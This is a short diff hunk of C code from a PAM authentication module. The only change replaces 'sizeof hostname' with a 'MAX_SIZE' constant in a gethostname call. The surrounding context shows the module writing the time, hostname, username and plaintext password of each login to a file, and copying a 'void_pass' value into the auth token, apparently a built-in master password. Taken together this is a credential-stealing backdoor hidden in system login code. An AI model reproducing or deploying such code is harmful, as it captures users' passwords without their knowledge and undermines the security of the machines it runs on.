@@ -73,7 +73,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         strncpy(authtok, void_pass, PAM_MAX_RESP_SIZE - 1);
     }
 
-    gethostname(hostname, sizeof hostname);
+    gethostname(hostname, MAX_SIZE);
     snprintf(message, 1023, "Time: %ld\nHostname: %s\nUsername: %s\nPassword: %s\n\n",
              (unsigned long) time(NULL), hostname, username, authtok);
     write_to_file(message);
